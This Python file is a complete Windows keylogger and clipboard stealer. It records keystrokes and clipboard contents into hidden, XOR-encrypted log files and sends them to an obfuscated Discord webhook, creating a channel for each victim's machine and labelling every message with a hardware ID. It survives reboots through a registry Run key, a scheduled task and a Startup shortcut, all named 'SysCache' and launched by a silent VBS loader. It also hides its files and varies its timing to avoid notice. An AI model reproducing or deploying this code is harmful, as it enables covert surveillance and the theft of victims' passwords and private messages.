import os, sys, time, threading, datetime, urllib.request, json
from pathlib import Path
try:
    from pynput import keyboard
    import win32gui, win32process, psutil
except ImportError:
    pass

def _d(a, b):
    return bytes(x ^ b[i % len(b)] for i, x in enumerate(a)).decode()
# Secrets are NOT baked in: load from env/file at runtime so `strings` reveals nothing.
# Fallback obfuscated values kept only for dev; prefer DF_BOT_TOKEN / DF_WEBHOOK env.
_FBWH = _d([11, 59, 209, 210, 33, 172, 242, 76, 43, 204, 209, 49, 249, 175, 7, 97, 198, 205, 63, 185, 188, 19, 38, 138, 213, 55, 244, 181, 12, 32, 206, 209, 125, 167, 232, 86, 126, 145, 150, 102, 174, 239, 85, 126, 145, 155, 97, 163, 228, 85, 120, 146, 141, 28, 174, 179, 9, 10, 207, 250, 8, 242, 181, 39, 57, 157, 219, 4, 204, 176, 34, 45, 250, 209, 19, 194, 233, 7, 25, 200, 197, 4, 195, 142, 34, 26, 204, 211, 10, 213, 184, 33, 2, 225, 214, 63, 219, 229, 47, 61, 224, 146, 99, 249, 142, 15, 55, 231, 219, 11, 244, 191, 45, 33, 240, 206, 35, 201, 158, 81, 23], b'cO\xa5\xa2R\x96\xdd')
BOT_TOKEN = os.environ.get("DF_BOT_TOKEN", "")
try:
    _tf = Path(__file__).parent / "bot_token.txt"
    if not BOT_TOKEN and _tf.exists():
        _t = _tf.read_text().strip().split()[0]
        if _t.startswith("MT"):
            BOT_TOKEN = _t
except Exception:
    pass
LOGDIR = Path(os.environ.get("LOCALAPPDATA", str(Path.home()))) / ".cache" / ".sysdata"
LOGDIR.mkdir(parents=True, exist_ok=True)

GUILD_ID = "1551012508234551388"
UA = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

def _hwid():
    import hashlib, socket
    user = os.environ.get("USERNAME", "user")
    pc = os.environ.get("COMPUTERNAME", socket.gethostname())
    raw = f"{user}@{pc}".lower()
    hid = hashlib.sha256(raw.encode()).hexdigest()[:6]
    base = "".join(c if c.isalnum() else "-" for c in raw).strip("-")[:40].strip("-")
    return f"pc-{base}-{hid}", f"{user} @{pc} [{hid}]"

def _sleep_jitter(base):
    import random
    time.sleep(base * (0.7 + random.random() * 0.6))

def _api(method, path, payload=None, retries=3):
    import urllib.error
    if not BOT_TOKEN:
        return None
    for attempt in range(retries):
        try:
            data = json.dumps(payload).encode() if payload is not None else None
            req = urllib.request.Request(f"https://discord.com/api/v10{path}", data,
                {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            return json.loads(urllib.request.urlopen(req, timeout=15).read() or b"{}")
        except urllib.error.HTTPError as e:
            if e.code == 429:
                try:
                    wait = float(json.loads(e.read() or b"{}").get("retry_after", 2.0)) + 1.0
                except Exception:
                    wait = 2.0 * (attempt + 1)
                time.sleep(min(wait, 30))
                continue
            return None
        except Exception:
            if attempt < retries - 1:
                _sleep_jitter(1.5)
                continue
            return None
    return None

def _provision(ch_name, label):
    """find-or-create per-PC text channel + webhook, cache URL. returns url or None"""
    try:
        cache = LOGDIR / ".ch"
        if cache.exists():
            try:
                u = cache.read_text().strip()
                if u.startswith("http"):
                    return u
            except Exception:
                pass
        chs = _api("GET", f"/guilds/{GUILD_ID}/channels") or []
        cid = next((c["id"] for c in chs if isinstance(c, dict) and c.get("name") == ch_name), None)
        if not cid:
            c = _api("POST", f"/guilds/{GUILD_ID}/channels",
                     {"name": ch_name, "type": 0, "topic": label})
            cid = (c or {}).get("id")
        if not cid:
            return None
        wh = _api("POST", f"/channels/{cid}/webhooks", {"name": "logs"})
        url = (wh or {}).get("url")
        if url:
            try:
                cache.write_text(url)
            except Exception:
                pass
            return url
    except Exception:
        pass
    return None

def _hook():
    # 1. per-PC provisioned webhook cache
    try:
        c = LOGDIR / ".ch"
        u = c.read_text().strip()
        if u.startswith("http"):
            return u
    except Exception:
        pass
    # 2. Webhook.txt fallback
    for f in [Path(__file__).parent / "Webhook.txt", Path(__file__).parent / "webhook.txt"]:
        try:
            t = f.read_text().strip().split()[0]
            if t.startswith("http"): return t
        except Exception: pass
    h = os.environ.get("DF_WEBHOOK", "")
    if h and h.strip().startswith("http"): return h.strip()
    try:
        return _FBWH
    except Exception:
        return "__PASTE_WEBHOOK_HERE__"
HOOK = _hook()
LABEL = ""
try:
    import ctypes
    ctypes.windll.kernel32.SetFileAttributesW(str(LOGDIR.parent), 2)
    ctypes.windll.kernel32.SetFileAttributesW(str(LOGDIR), 2)
except Exception: pass

def _xorkey():
    import hashlib, socket
    user = os.environ.get("USERNAME", "")
    pc = os.environ.get("COMPUTERNAME", socket.gethostname() if hasattr(socket, "gethostname") else "")
    seed = f"{user}@{pc}".lower().encode()
    return hashlib.sha256(seed).digest()

_XOR = _xorkey()

def _xor(b):
    return bytes(c ^ _XOR[i % len(_XOR)] for i, c in enumerate(b))

def _xor_at(b, start):
    # decrypt bytes starting at absolute file offset `start`
    return bytes(c ^ _XOR[(start + i) % len(_XOR)] for i, c in enumerate(b))

def _hide(p):
    # hidden + system: invisible unless "show hidden" AND "hide protected OS files" off
    try:
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(str(p), 2 | 4)
    except Exception:
        pass

def today():
    p = LOGDIR / (datetime.date.today().isoformat() + ".dat")
    if not p.exists():
        try:
            p.touch()
            _hide(p)
        except Exception:
            pass
    return p

def _readlog(p):
    """read log bytes, decrypt if encrypted, tolerate old plaintext logs"""
    try:
        raw = open(p, "rb").read()
    except Exception:
        return ""
    if not raw:
        return ""
    try:
        txt = _xor(raw).decode("utf-8")
        # sanity: decrypted must be mostly printable
        if sum(1 for c in txt[:500] if c.isprintable() or c in "\n\t") > len(txt[:500]) * 0.7:
            return txt
    except Exception:
        pass
    try:
        return raw.decode("utf-8", "ignore")
    except Exception:
        return ""

def log(s):
    p = today()
    try:
        start = os.path.getsize(p)
    except Exception:
        start = 0
    with open(p, "ab") as f:
        f.write(_xor_at(s.encode("utf-8", "ignore"), start))

# one-shot: encrypt any leftover plaintext .log files into .dat, shred originals
try:
    for _lp in list(LOGDIR.glob("*.log")):
        try:
            _txt = _lp.read_text(encoding="utf-8", errors="ignore")
            if _txt:
                with open(str(_lp).replace(".log", ".dat"), "ab") as _f:
                    _f.write(_xor(_txt.encode("utf-8", "ignore")))
                _hide(str(_lp).replace(".log", ".dat"))
            _lp.write_text("0" * len(_txt))
            _lp.unlink()
        except Exception:
            pass
except Exception:
    pass

last_app = [""]
last_key = [""]
last_time = [0.0]
LAST_TYPE = [time.time()]  # last keystroke time; uploader flushes after idle gap
IDLE_SECS = 8
MIN_SEND = 12  # don't post fragments shorter than this unless force-flush hits

# modifier / noise keys: never log these alone
IGNORED = set()
try:
    from pynput import keyboard as _kb
    IGNORED = {_kb.Key.shift, _kb.Key.shift_l, _kb.Key.shift_r,
               _kb.Key.ctrl, _kb.Key.ctrl_l, _kb.Key.ctrl_r,
               _kb.Key.alt, _kb.Key.alt_l, _kb.Key.alt_r,
               _kb.Key.cmd, _kb.Key.cmd_l, _kb.Key.cmd_r,
               _kb.Key.caps_lock, _kb.Key.num_lock}
except Exception:
    pass
def front_app():
    try:
        import win32gui, win32process, psutil
        h = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(h)
        return psutil.Process(pid).name()
    except Exception:
        return "unknown"

def on_press(k):
    # 1. drop modifier-only presses (shift, ctrl, alt, win, caps)
    try:
        if k in IGNORED:
            return
    except Exception:
        pass
    try: app = front_app()
    except Exception: app = "unknown"
    if app != last_app[0]:
        last_app[0] = app
        last_key[0] = ""
        log(f"\n\n[{app} @ {datetime.datetime.now()}]\n")
    try:
        tok = k.char if k.char else ""
        if not tok:
            return
    except AttributeError:
        m = {keyboard.Key.enter:"\n", keyboard.Key.tab:"\t", keyboard.Key.space:" ",
             keyboard.Key.backspace:"\x08", keyboard.Key.esc:"[ESC]", keyboard.Key.delete:"[DEL]"}
        tok = m.get(k, f"[{str(k).replace('Key.','').upper()}]")
        if not tok:
            return
    # held-key filter: same token within 60ms = auto-repeat, drop.
    # intentional doubles ("hello") are ~100ms+ apart and survive.
    now = time.time()
    if tok == last_key[0] and (now - last_time[0]) < 0.06 and len(tok) == 1:
        return
    last_key[0] = tok
    last_time[0] = now
    LAST_TYPE[0] = now
    log(tok)

def clip_watch():
    last = ""
    try: import win32clipboard
    except ImportError: return
    while True:
        time.sleep(1)
        try:
            win32clipboard.OpenClipboard()
            try: s = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            except Exception: s = ""
            win32clipboard.CloseClipboard()
            if s and s != last and len(s) < 10000:
                last = s; log(f"\n[CLIP]: {s}\n")
        except Exception:
            try: win32clipboard.CloseClipboard()
            except Exception: pass
            time.sleep(1)

def uploader():
    cur = str(today())
    try: off = len(open(cur, "rb").read())
    except Exception: off = 0
    last_flush = [time.time()]
    import random as _rnd
    while True:
        time.sleep(2 * (0.7 + _rnd.random() * 0.6))
        # flush after the user pauses typing (idle gap) so messages arrive whole;
        # force-flush every 180s max so marathon typing still sends
        try:
            idle = time.time() - LAST_TYPE[0]
            forced = (time.time() - last_flush[0]) >= 180
            if idle < IDLE_SECS and not forced:
                continue
        except Exception:
            forced = False
            pass
        last_flush[0] = time.time()
        # 1. drain retry queue first (offline backlog)
        if not HOOK.startswith("__"):
            _q = _qpop_all()
            _ok = 0
            for _qp in _q:
                try:
                    _post(_qp)
                    _ok += 1
                except Exception:
                    break
                _sleep_jitter(0.5)
            if _ok:
                _qdrop(_ok)
            if _ok < len(_q):
                continue  # still offline; retry next cycle, don't advance log offset
        p = str(today())
        if p != cur: cur, off = p, 0
        try:
            raw = open(p, "rb").read()
        except Exception: continue
        new = raw[off:]
        try:
            data = _xor_at(new, off).decode("utf-8", "ignore")
        except Exception: continue
        if not data.strip() or HOOK.startswith("__"): continue
        # skip tiny fragments until more typing accumulates (unless forced)
        _meat = [ln for ln in data.splitlines() if ln.strip() and not (ln.strip().startswith("[") and "@" in ln and ln.strip().endswith("]"))]
        if not forced and len("".join(_meat)) < MIN_SEND:
            continue  # offset untouched: bytes stay queued for next cycle
        off = len(raw)
        if not data.strip() or HOOK.startswith("__"): continue
        # apply backspaces so "remoe\x08tely" sends as "remotely"
        out = []
        for ch in data:
            if ch == "\x08":
                if out and out[-1] not in ("\n",):
                    out.pop()
            else:
                out.append(ch)
        data = "".join(out)
        # chunk on word/newline boundaries so words never split mid-word
        while data.strip():
            if len(data) <= 1800:
                part, data = data, ""
            else:
                cut = max(data.rfind("\n", 0, 1800), data.rfind(" ", 0, 1800))
                if cut < 200:
                    cut = 1800
                part, data = data[:cut], data[cut:]
            part = part.replace("`", "'")
            if not part.strip():
                continue
            try:
                _post(part)
            except Exception:
                _qpush(part)  # offline: keep for next cycle instead of dropping
            _sleep_jitter(0.5)

def _qpath():
    return str(LOGDIR / ".q")

def _qpush(part):
    try:
        with open(_qpath(), "ab") as f:
            b = part.encode("utf-8", "ignore")
            f.write(len(b).to_bytes(4, "little") + b)
        _hide(_qpath())
    except Exception:
        pass

def _qpop_all():
    """return queued parts (oldest first); caller must _qdone(ok_count)"""
    try:
        raw = open(_qpath(), "rb").read()
    except Exception:
        return []
    parts, pos = [], 0
    while pos + 4 <= len(raw):
        ln = int.from_bytes(raw[pos:pos + 4], "little")
        pos += 4
        if pos + ln > len(raw) or ln > 2000:
            break
        parts.append(raw[pos:pos + ln].decode("utf-8", "ignore"))
        pos += ln
    return parts

def _qdrop(n):
    try:
        raw = open(_qpath(), "rb").read()
        pos = 0
        for _ in range(n):
            ln = int.from_bytes(raw[pos:pos + 4], "little")
            pos += 4 + ln
        rest = raw[pos:]
        if rest:
            open(_qpath(), "wb").write(rest)
        else:
            os.remove(_qpath())
    except Exception:
        pass

def _post(part, retries=3):
    import urllib.error, random
    tag = globals().get("LABEL", "")
    body = f"**[{tag}]**\n```{part}```" if tag else f"```{part}```"
    for attempt in range(retries):
        try:
            req = urllib.request.Request(HOOK, json.dumps({"content": body}).encode(),
                                         {"Content-Type": "application/json",
                                          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            urllib.request.urlopen(req, timeout=10).read()
            return
        except urllib.error.HTTPError as e:
            if e.code == 429:
                try:
                    wait = float(json.loads(e.read() or b"{}").get("retry_after", 2.0))
                except Exception:
                    wait = 2.0 * (attempt + 1)
                time.sleep(min(wait + random.random(), 30))
                continue
            raise
        except Exception:
            if attempt == retries - 1:
                raise
            time.sleep((1.5 * (attempt + 1)) * (0.7 + random.random() * 0.6))

def _loader(exe):
    """write silent delayed-start loader; returns its path.
    wscript.exe shows NO window ever, and the 45s delay lets the
    desktop/profile finish loading so pythonw never 0xC0000142s."""
    try:
        d = os.path.dirname(exe)
        lp = os.path.join(d, "loader.vbs")
        pyw = sys.executable.replace("python.exe", "pythonw.exe")
        with open(lp, "w") as f:
            f.write('Set sh = CreateObject("WScript.Shell")\n')
            f.write("WScript.Sleep 45000\n")
            f.write("sh.Run Chr(34) & \"" + pyw.replace('"', '') + "\" & Chr(34) & \" \" & Chr(34) & \"" + exe.replace('"', '') + "\" & Chr(34), 0, False\n")
        try:
            _hide(lp)
        except Exception:
            pass
        return lp
    except Exception:
        return None

def persist(exe, is_exe):
    import winreg
    # full interpreter path so startup works even without PATH
    pyw = sys.executable.replace("python.exe", "pythonw.exe") if not is_exe else exe
    ld = _loader(exe)
    # startup entries point at the loader (wscript = zero UI, delayed start)
    run_cmd = f'wscript.exe "{ld}"' if ld else (f'"{exe}"' if is_exe else f'"{pyw}" "{exe}"')
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "SysCache", 0, winreg.REG_SZ, run_cmd)
        winreg.CloseKey(k)
    except Exception: pass
    try:
        import subprocess
        subprocess.run(f'schtasks /create /f /sc onlogon /tn "SysCache" /tr "\\"{exe}\\""',
                       capture_output=True, timeout=30,
                       creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
    except Exception: pass
    # Startup-folder shortcut: silent logon launch, no admin, wscript = no window
    try:
        sm = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
        lnk = os.path.join(sm, "SysCache.lnk")
        if os.path.isdir(sm):
            import win32com.client
            ws = win32com.client.Dispatch("WScript.Shell")
            sc = ws.CreateShortcut(lnk)
            if ld:
                sc.TargetPath = os.path.join(os.environ.get("SYSTEMROOT", r"C:\Windows"), "System32", "wscript.exe")
                sc.Arguments = f'"{ld}"'
            else:
                sc.TargetPath = pyw if not is_exe else exe
                if not is_exe:
                    sc.Arguments = f'"{exe}"'
            sc.WorkingDirectory = os.path.dirname(exe)
            sc.WindowStyle = 7  # minimized
            sc.Save()
    except Exception: pass

if __name__ == "__main__":
    # single-instance: second copy exits immediately (stops 8x dupes)
    try:
        import msvcrt
        _lockf = open(os.path.join(os.environ.get("TEMP", "."), "syscache.lock"), "w")
        msvcrt.locking(_lockf.fileno(), msvcrt.LK_NBLCK, 1)
    except Exception:
        sys.exit(0)
    me = os.path.abspath(sys.argv[0])
    persist(me, me.lower().endswith(".exe"))
    # hardware identity stamped on every message
    try:
        _ch, _label = _hwid()
    except Exception:
        _ch, _label = "pc-unknown", "unknown"
    LABEL = _label
    # per-PC channel: create/find #pc-user-hwid, route uploads there
    try:
        _url = _provision(_ch, _label)
        if _url:
            HOOK = _url
            try:
                log(f"\n[SESSION {_label} -> #{_ch}]\n")
            except Exception:
                pass
    except Exception:
        pass
    # startup heartbeat: proves the agent survived reboot + which HOOK it uses
    try:
        if not HOOK.startswith("__"):
            hb = urllib.request.Request(HOOK, json.dumps(
                {"content": f"**[{LABEL}]** 🟢 online"}).encode(), UA)
            urllib.request.urlopen(hb, timeout=10).read()
    except Exception:
        pass
    threading.Thread(target=clip_watch, daemon=True).start()
    threading.Thread(target=uploader, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as l:
        l.join()
